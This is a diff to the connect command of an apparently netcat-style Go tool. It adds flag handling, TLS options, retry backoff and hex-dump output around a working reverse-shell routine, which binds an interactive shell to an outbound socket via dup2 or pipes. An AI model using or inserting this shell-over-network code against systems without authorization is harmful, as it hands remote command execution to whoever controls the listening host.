@@ -5,32 +5,47 @@ import (
 	"crypto/x509"
 	"fmt"
 	"io"
-	"io/ioutil"
+	"log"
 	"net"
 	"net/url"
+	"os"
 	"os/exec"
 	"runtime"
 	"strings"
+	"syscall"
 	"time"
 
-	"github.com/fatih/color"
-	"github.com/ibrahmsql/gocat/internal/logger"
 	"github.com/spf13/cobra"
+	"github.com/ibrahmsql/gocat/internal/logger"
 	"golang.org/x/net/proxy"
 )
 
 var (
-	shellPath    string
-	timeout      time.Duration
-	retryCount   int
-	keepAlive    bool
-	proxyURL     string
-	useSSL       bool
-	verifyCert   bool
-	caCertFile   string
-	useUDP       bool
-	forceIPv6    bool
-	forceIPv4    bool
+	shellPath          string
+	timeout            time.Duration
+	retryCount         int
+	keepAlive          bool
+	proxyURL           string
+	useSSL             bool
+	verifyCert         bool
+	caCertFile         string
+	useUDP             bool
+	forceIPv6          bool
+	forceIPv4          bool
+	// Global flags for connect
+	sendOnly           bool
+	recvOnly           bool
+	outputFile         string
+	hexDumpFile        string
+	appendOutput       bool
+	noShutdown         bool
+	// Protocol flags
+	telnetMode         bool
+	crlfMode           bool
+	zeroIOMode         bool
+	// Source flags
+	sourceAddress      string
+	sourcePort         int
 )
 
 var connectCmd = &cobra.Command{
@@ -51,20 +66,20 @@ func init() {
 		defaultShell = "cmd.exe"
 	}
 
-	connectCmd.Flags().StringVarP(&shellPath, "shell", "s", defaultShell, "Shell to use for command execution")
-	connectCmd.Flags().DurationVarP(&timeout, "timeout", "t", 30*time.Second, "Connection timeout")
-	connectCmd.Flags().IntVarP(&retryCount, "retry", "r", 3, "Number of retry attempts")
-	connectCmd.Flags().BoolVarP(&keepAlive, "keep-alive", "k", false, "Enable keep-alive")
-	connectCmd.Flags().StringVarP(&proxyURL, "proxy", "p", "", "Proxy URL (socks5:// or http://)")
-	connectCmd.Flags().BoolVarP(&useSSL, "ssl", "S", false, "Use SSL/TLS")
-	connectCmd.Flags().BoolVarP(&verifyCert, "verify-cert", "C", false, "Verify SSL certificate")
-	connectCmd.Flags().StringVarP(&caCertFile, "ca-cert", "c", "", "CA certificate file")
-	connectCmd.Flags().BoolVarP(&useUDP, "udp", "u", false, "Use UDP instead of TCP")
-	connectCmd.Flags().BoolVarP(&forceIPv6, "ipv6", "6", false, "Force IPv6")
-	connectCmd.Flags().BoolVarP(&forceIPv4, "ipv4", "4", false, "Force IPv4")
+	connectCmd.Flags().StringVar(&shellPath, "shell", defaultShell, "Shell to use for command execution")
+	connectCmd.Flags().DurationVar(&timeout, "connect-timeout", 30*time.Second, "Connection timeout")
+	connectCmd.Flags().IntVar(&retryCount, "retry", 3, "Number of retry attempts")
+	connectCmd.Flags().BoolVar(&keepAlive, "connect-keep-alive", false, "Enable keep-alive")
+	connectCmd.Flags().StringVar(&proxyURL, "connect-proxy", "", "Proxy URL (socks5:// or http://)")
+	connectCmd.Flags().BoolVar(&useSSL, "connect-ssl", false, "Use SSL/TLS")
+	connectCmd.Flags().BoolVar(&verifyCert, "verify-cert", false, "Verify SSL certificate")
+	connectCmd.Flags().StringVar(&caCertFile, "ca-cert", "", "CA certificate file")
+	connectCmd.Flags().BoolVar(&useUDP, "connect-udp", false, "Use UDP instead of TCP")
+	connectCmd.Flags().BoolVar(&forceIPv6, "connect-ipv6", false, "Force IPv6")
+	connectCmd.Flags().BoolVar(&forceIPv4, "connect-ipv4", false, "Force IPv4")
 
 	// Mark conflicting flags
-	connectCmd.MarkFlagsMutuallyExclusive("ipv4", "ipv6")
+	connectCmd.MarkFlagsMutuallyExclusive("connect-ipv4", "connect-ipv6")
 }
 
 func runConnect(cmd *cobra.Command, args []string) {
@@ -76,6 +91,81 @@ func runConnect(cmd *cobra.Command, args []string) {
 	} else {
 		host = args[0]
 		port = args[1]
+	}
+
+	// Override local flags with global flags if set
+	if globalSSL, _ := cmd.Root().PersistentFlags().GetBool("ssl"); globalSSL {
+		useSSL = true
+	}
+	if globalUDP, _ := cmd.Root().PersistentFlags().GetBool("udp"); globalUDP {
+		useUDP = true
+	}
+	if globalIPv4, _ := cmd.Root().PersistentFlags().GetBool("ipv4"); globalIPv4 {
+		forceIPv4 = true
+	}
+	if globalIPv6, _ := cmd.Root().PersistentFlags().GetBool("ipv6"); globalIPv6 {
+		forceIPv6 = true
+	}
+	if globalWait, _ := cmd.Root().PersistentFlags().GetDuration("wait"); globalWait > 0 {
+		timeout = globalWait
+	}
+	if globalProxy, _ := cmd.Root().PersistentFlags().GetString("proxy"); globalProxy != "" {
+		proxyURL = globalProxy
+	}
+	if globalSSLVerify, _ := cmd.Root().PersistentFlags().GetBool("ssl-verify"); globalSSLVerify {
+		verifyCert = true
+	}
+	if globalSSLTrust, _ := cmd.Root().PersistentFlags().GetString("ssl-trustfile"); globalSSLTrust != "" {
+		caCertFile = globalSSLTrust
+	}
+	// Execution flags
+	if globalExec, _ := cmd.Root().PersistentFlags().GetString("exec"); globalExec != "" {
+		shellPath = globalExec
+	}
+	if globalShExec, _ := cmd.Root().PersistentFlags().GetString("sh-exec"); globalShExec != "" {
+		shellPath = "/bin/sh"
+		// Store the command to execute
+		os.Setenv("GOCAT_SH_EXEC", globalShExec)
+	}
+	// Data flow control flags
+	if globalSendOnly, _ := cmd.Root().PersistentFlags().GetBool("send-only"); globalSendOnly {
+		sendOnly = true
+	}
+	if globalRecvOnly, _ := cmd.Root().PersistentFlags().GetBool("recv-only"); globalRecvOnly {
+		recvOnly = true
+	}
+	if globalNoShutdown, _ := cmd.Root().PersistentFlags().GetBool("no-shutdown"); globalNoShutdown {
+		noShutdown = true
+	}
+	// Output flags
+	if globalOutput, _ := cmd.Root().PersistentFlags().GetString("output"); globalOutput != "" {
+		outputFile = globalOutput
+	}
+	if globalHexDump, _ := cmd.Root().PersistentFlags().GetString("hex-dump"); globalHexDump != "" {
+		hexDumpFile = globalHexDump
+	}
+	if globalAppend, _ := cmd.Root().PersistentFlags().GetBool("append-output"); globalAppend {
+		appendOutput = true
+	}
+	if globalNoShutdown, _ := cmd.Root().PersistentFlags().GetBool("no-shutdown"); globalNoShutdown {
+		noShutdown = true
+	}
+	// Protocol flags
+	if globalTelnet, _ := cmd.Root().PersistentFlags().GetBool("telnet"); globalTelnet {
+		telnetMode = true
+	}
+	if globalCRLF, _ := cmd.Root().PersistentFlags().GetBool("crlf"); globalCRLF {
+		crlfMode = true
+	}
+	if globalZeroIO, _ := cmd.Root().PersistentFlags().GetBool("zero-io"); globalZeroIO {
+		zeroIOMode = true
+	}
+	// Source flags
+	if globalSource, _ := cmd.Root().PersistentFlags().GetString("source"); globalSource != "" {
+		sourceAddress = globalSource
+	}
+	if globalSourcePort, _ := cmd.Root().PersistentFlags().GetInt("source-port"); globalSourcePort > 0 {
+		sourcePort = globalSourcePort
 	}
 
 	if err := connect(host, port, shellPath); err != nil {
@@ -97,14 +187,23 @@ func connect(host, port, shell string) error {
 		network += "4"
 	}
 
+	logger.Debug("Connecting to %s using %s protocol", address, network)
+	if useSSL {
+		logger.Debug("SSL/TLS enabled")
+	}
+	if proxyURL != "" {
+		logger.Debug("Using proxy: %s", proxyURL)
+	}
+
 	var conn net.Conn
 	var err error
 
-	// Retry logic
+	// Retry logic with exponential backoff
 	for attempt := 0; attempt <= retryCount; attempt++ {
 		if attempt > 0 {
-			logger.Info("Retrying connection", "attempt", attempt, "max", retryCount)
-			time.Sleep(time.Second * time.Duration(attempt))
+			backoff := time.Duration(attempt*attempt) * time.Second
+			logger.Info("Retrying connection (attempt %d/%d) in %v", attempt, retryCount+1, backoff)
+			time.Sleep(backoff)
 		}
 
 		conn, err = dialWithOptions(network, address)
@@ -115,19 +214,32 @@ func connect(host, port, shell string) error {
 		if attempt == retryCount {
 			return fmt.Errorf("failed to connect to %s after %d attempts: %v", address, retryCount+1, err)
 		}
+		logger.Warn("Connection attempt %d failed: %v", attempt+1, err)
 	}
 
-	defer conn.Close()
+	defer func() {
+		if err := conn.Close(); err != nil {
+			logger.Error("Error closing connection: %v", err)
+		}
+	}()
 
 	// Configure keep-alive for TCP connections
 	if keepAlive && !useUDP {
 		if tcpConn, ok := conn.(*net.TCPConn); ok {
-			tcpConn.SetKeepAlive(true)
-			tcpConn.SetKeepAlivePeriod(30 * time.Second)
+			if err := tcpConn.SetKeepAlive(true); err != nil {
+				logger.Warn("Failed to enable keep-alive: %v", err)
+			} else {
+				if err := tcpConn.SetKeepAlivePeriod(30 * time.Second); err != nil {
+				logger.Warn("Failed to set keep-alive period: %v", err)
+			}
+			}
 		}
 	}
 
-	color.Green("Connected to %s", address)
+	theme := logger.GetCurrentTheme()
+	if _, err := theme.Success.Printf("✓ Connected to %s\n", address); err != nil {
+		log.Printf("Error printing success message: %v", err)
+	}
 
 	if runtime.GOOS == "windows" {
 		return connectWindows(conn, shell)
@@ -185,7 +297,9 @@ func dialWithHTTPProxy(network, address string, proxyURL *url.URL, dialer *net.D
 	connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", address, address)
 	_, err = proxyConn.Write([]byte(connectReq))
 	if err != nil {
-		proxyConn.Close()
+		if closeErr := proxyConn.Close(); closeErr != nil {
+			log.Printf("Error closing proxy connection: %v", closeErr)
+		}
 		return nil, fmt.Errorf("failed to send CONNECT request: %v", err)
 	}
 
@@ -193,13 +307,17 @@ func dialWithHTTPProxy(network, address string, proxyURL *url.URL, dialer *net.D
 	buffer := make([]byte, 1024)
 	n, err := proxyConn.Read(buffer)
 	if err != nil {
-		proxyConn.Close()
+		if closeErr := proxyConn.Close(); closeErr != nil {
+			log.Printf("Error closing proxy connection: %v", closeErr)
+		}
 		return nil, fmt.Errorf("failed to read proxy response: %v", err)
 	}
 
 	response := string(buffer[:n])
 	if !strings.Contains(response, "200") {
-		proxyConn.Close()
+		if closeErr := proxyConn.Close(); closeErr != nil {
+			log.Printf("Error closing proxy connection: %v", closeErr)
+		}
 		return nil, fmt.Errorf("proxy connection failed: %s", response)
 	}
 
@@ -213,7 +331,7 @@ func dialWithTLS(network, address string, dialer *net.Dialer) (net.Conn, error) 
 
 	// Load CA certificate if provided
 	if caCertFile != "" {
-		caCert, err := ioutil.ReadFile(caCertFile)
+		caCert, err := os.ReadFile(caCertFile)
 		if err != nil {
 			return nil, fmt.Errorf("failed to read CA certificate: %v", err)
 		}
@@ -224,10 +342,129 @@ func dialWithTLS(network, address string, dialer *net.Dialer) (net.Conn, error) 
 		tlsConfig.RootCAs = caCertPool
 	}
 
+	// Advanced SSL/TLS features from global flags
+	if sslServerName, _ := rootCmd.PersistentFlags().GetString("ssl-servername"); sslServerName != "" {
+		tlsConfig.ServerName = sslServerName
+	}
+
+	if sslCiphers, _ := rootCmd.PersistentFlags().GetString("ssl-ciphers"); sslCiphers != "" {
+		// Parse cipher suites
+		cipherSuites := parseCipherSuites(sslCiphers)
+		if len(cipherSuites) > 0 {
+			tlsConfig.CipherSuites = cipherSuites
+		}
+	}
+
+	if sslALPN, _ := rootCmd.PersistentFlags().GetString("ssl-alpn"); sslALPN != "" {
+		// Parse ALPN protocols
+		protocols := strings.Split(sslALPN, ",")
+		for i, proto := range protocols {
+			protocols[i] = strings.TrimSpace(proto)
+		}
+		tlsConfig.NextProtos = protocols
+	}
+
 	return tls.DialWithDialer(dialer, network, address, tlsConfig)
 }
 
+// parseCipherSuites converts cipher suite names to IDs
+func parseCipherSuites(ciphers string) []uint16 {
+	cipherMap := map[string]uint16{
+		"TLS_RSA_WITH_AES_128_CBC_SHA":                tls.TLS_RSA_WITH_AES_128_CBC_SHA,
+		"TLS_RSA_WITH_AES_256_CBC_SHA":                tls.TLS_RSA_WITH_AES_256_CBC_SHA,
+		"TLS_RSA_WITH_AES_128_GCM_SHA256":             tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
+		"TLS_RSA_WITH_AES_256_GCM_SHA384":             tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
+		"TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA":          tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
+		"TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA":          tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
+		"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256":       tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+		"TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384":       tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+		"TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA":        tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
+		"TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA":        tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
+		"TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256":     tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+		"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384":     tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+	}
+
+	cipherNames := strings.Split(ciphers, ":")
+	var result []uint16
+	for _, name := range cipherNames {
+		name = strings.TrimSpace(name)
+		if id, exists := cipherMap[name]; exists {
+			result = append(result, id)
+		}
+	}
+	return result
+}
+
 func connectUnix(conn net.Conn, shell string) error {
+	// Get the file descriptor from the connection
+	var fd int
+	switch c := conn.(type) {
+	case *net.TCPConn:
+		file, err := c.File()
+		if err != nil {
+			return fmt.Errorf("failed to get file descriptor: %v", err)
+		}
+		defer func() {
+			if err := file.Close(); err != nil {
+				log.Printf("Error closing file: %v", err)
+			}
+		}()
+		fd = int(file.Fd())
+	case *net.UnixConn:
+		file, err := c.File()
+		if err != nil {
+			return fmt.Errorf("failed to get file descriptor: %v", err)
+		}
+		defer func() {
+			if err := file.Close(); err != nil {
+				log.Printf("Error closing file: %v", err)
+			}
+		}()
+		fd = int(file.Fd())
+	default:
+		// Fallback to pipe-based approach for other connection types
+		return connectUnixPipes(conn, shell)
+	}
+
+	// Duplicate file descriptor for stdin, stdout, stderr
+	if err := syscall.Dup2(fd, int(os.Stdin.Fd())); err != nil {
+		return fmt.Errorf("failed to dup stdin: %v", err)
+	}
+	if err := syscall.Dup2(fd, int(os.Stdout.Fd())); err != nil {
+		return fmt.Errorf("failed to dup stdout: %v", err)
+	}
+	if err := syscall.Dup2(fd, int(os.Stderr.Fd())); err != nil {
+		return fmt.Errorf("failed to dup stderr: %v", err)
+	}
+
+	// Create shell command
+	cmd := exec.Command(shell, "-i")
+	cmd.Stdin = os.Stdin
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+
+	// Start the shell
+	if err := cmd.Start(); err != nil {
+		return fmt.Errorf("failed to start shell: %v", err)
+	}
+
+	// Wait for the shell to exit
+	if err := cmd.Wait(); err != nil {
+		logger.Warn("Shell exited with error: %v", err)
+	} else {
+		logger.Info("Shell exited normally")
+	}
+
+	return nil
+}
+
+// Fallback method using pipes for connection types that don't support File()
+func connectUnixPipes(conn net.Conn, shell string) error {
+	// Handle data flow control modes
+	if sendOnly || recvOnly {
+		return handleDataFlowControl(conn)
+	}
+
 	// Create shell command
 	cmd := exec.Command(shell, "-i")
 
@@ -245,13 +482,124 @@ func connectUnix(conn net.Conn, shell string) error {
 	if err := cmd.Wait(); err != nil {
 		logger.Warn("Shell exited with error: %v", err)
 	} else {
-		logger.Warn("Shell exited")
+		logger.Info("Shell exited normally")
 	}
 
 	return nil
 }
 
+// handleDataFlowControl implements send-only and recv-only modes
+func handleDataFlowControl(conn net.Conn) error {
+	var outputWriter io.Writer = os.Stdout
+	var inputReader io.Reader = os.Stdin
+
+	// Setup output file if specified
+	if outputFile != "" {
+		file, err := openOutputFile(outputFile, appendOutput)
+		if err != nil {
+			return fmt.Errorf("failed to open output file: %v", err)
+		}
+		defer file.Close()
+		outputWriter = file
+	}
+
+	// Setup hex dump file if specified
+	if hexDumpFile != "" {
+		hexFile, err := openOutputFile(hexDumpFile, appendOutput)
+		if err != nil {
+			return fmt.Errorf("failed to open hex dump file: %v", err)
+		}
+		defer hexFile.Close()
+		outputWriter = &hexDumper{writer: hexFile, original: outputWriter}
+	}
+
+	if sendOnly {
+		logger.Debug("Send-only mode: copying stdin to connection")
+		_, err := io.Copy(conn, inputReader)
+		if err != nil && !noShutdown {
+			return fmt.Errorf("send-only copy error: %v", err)
+		}
+		return nil
+	}
+
+	if recvOnly {
+		logger.Debug("Recv-only mode: copying connection to stdout")
+		_, err := io.Copy(outputWriter, conn)
+		if err != nil {
+			return fmt.Errorf("recv-only copy error: %v", err)
+		}
+		return nil
+	}
+
+	return nil
+}
+
+// openOutputFile opens a file for output with append mode support
+func openOutputFile(filename string, append bool) (*os.File, error) {
+	flags := os.O_CREATE | os.O_WRONLY
+	if append {
+		flags |= os.O_APPEND
+	} else {
+		flags |= os.O_TRUNC
+	}
+	return os.OpenFile(filename, flags, 0644)
+}
+
+// hexDumper implements hex dump output
+type hexDumper struct {
+	writer   io.Writer
+	original io.Writer
+	offset   int64
+}
+
+func (h *hexDumper) Write(p []byte) (n int, err error) {
+	// Write to original output if exists
+	if h.original != nil {
+		h.original.Write(p)
+	}
+
+	// Write hex dump
+	for i := 0; i < len(p); i += 16 {
+		end := i + 16
+		if end > len(p) {
+			end = len(p)
+		}
+
+		// Write offset
+		fmt.Fprintf(h.writer, "%08x  ", h.offset+int64(i))
+
+		// Write hex bytes
+		for j := i; j < end; j++ {
+			fmt.Fprintf(h.writer, "%02x ", p[j])
+		}
+
+		// Pad if necessary
+		for j := end; j < i+16; j++ {
+			fmt.Fprintf(h.writer, "   ")
+		}
+
+		// Write ASCII representation
+		fmt.Fprintf(h.writer, " |")
+		for j := i; j < end; j++ {
+			if p[j] >= 32 && p[j] <= 126 {
+				fmt.Fprintf(h.writer, "%c", p[j])
+			} else {
+				fmt.Fprintf(h.writer, ".")
+			}
+		}
+		fmt.Fprintf(h.writer, "|\n")
+	}
+
+	h.offset += int64(len(p))
+	return len(p), nil
+}
+
 func connectWindows(conn net.Conn, shell string) error {
+	// Handle data flow control modes
+	if sendOnly || recvOnly {
+		return handleDataFlowControl(conn)
+	}
+
 	// Create shell command
 	cmd := exec.Command(shell)
 
@@ -276,23 +624,36 @@ func connectWindows(conn net.Conn, shell string) error {
 		return fmt.Errorf("failed to start shell: %v", err)
 	}
 
-	// Copy data between connection and shell pipes
+	// Copy data between connection and shell pipes with output handling
+	var outputWriter io.Writer = conn
+	if outputFile != "" || hexDumpFile != "" {
+		outputWriter = createOutputWriter(conn)
+	}
+
 	go func() {
-		if _, err := io.Copy(stdin, conn); err != nil {
-			logger.Error("conn to stdin copy error: %v", err)
+		if !recvOnly {
+			if _, err := io.Copy(stdin, conn); err != nil {
+				logger.Error("conn to stdin copy error: %v", err)
+			}
 		}
-		stdin.Close()
+		if err := stdin.Close(); err != nil {
+			logger.Error("Error closing stdin: %v", err)
+		}
 	}()
 
 	go func() {
-		if _, err := io.Copy(conn, stdout); err != nil {
-			logger.Error("stdout to conn copy error: %v", err)
+		if !sendOnly {
+			if _, err := io.Copy(outputWriter, stdout); err != nil {
+				logger.Error("stdout to conn copy error: %v", err)
+			}
 		}
 	}()
 
 	go func() {
-		if _, err := io.Copy(conn, stderr); err != nil {
-			logger.Error("stderr to conn copy error: %v", err)
+		if !sendOnly {
+			if _, err := io.Copy(outputWriter, stderr); err != nil {
+				logger.Error("stderr to conn copy error: %v", err)
+			}
 		}
 	}()
 
@@ -304,4 +665,29 @@ func connectWindows(conn net.Conn, shell string) error {
 	}
 
 	return nil
+}
+
+// createOutputWriter creates appropriate output writer based on flags
+func createOutputWriter(defaultWriter io.Writer) io.Writer {
+	var writer io.Writer = defaultWriter
+
+	if outputFile != "" {
+		file, err := openOutputFile(outputFile, appendOutput)
+		if err != nil {
+			logger.Error("Failed to open output file: %v", err)
+			return defaultWriter
+		}
+		writer = file
+	}
+
+	if hexDumpFile != "" {
+		hexFile, err := openOutputFile(hexDumpFile, appendOutput)
+		if err != nil {
+			logger.Error("Failed to open hex dump file: %v", err)
+			return writer
+		}
+		writer = &hexDumper{writer: hexFile, original: writer}
+	}
+
+	return writer
 }
